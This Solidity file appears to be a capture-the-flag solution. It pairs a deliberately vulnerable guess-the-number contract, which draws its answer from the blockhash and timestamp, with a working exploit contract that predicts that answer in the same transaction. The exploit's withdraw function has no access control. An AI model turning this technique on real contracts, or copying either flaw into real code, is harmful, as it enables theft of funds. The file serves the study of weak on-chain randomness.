pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

interface IChallenge {
    function guess(uint8) external payable;
}
contract GuessTheNewNumberExploit {
    function exploit(address _challenge) external payable {
        require(msg.value == 1 ether);
        IChallenge(_challenge).guess.value(msg.value)(uint8(keccak256(block.blockhash(block.number - 1), now)));
        require(address(this).balance == 2 ether);
    }
    function withdraw() external payable {
        msg.sender.transfer(address(this).balance);
    }
    function() external payable {}
}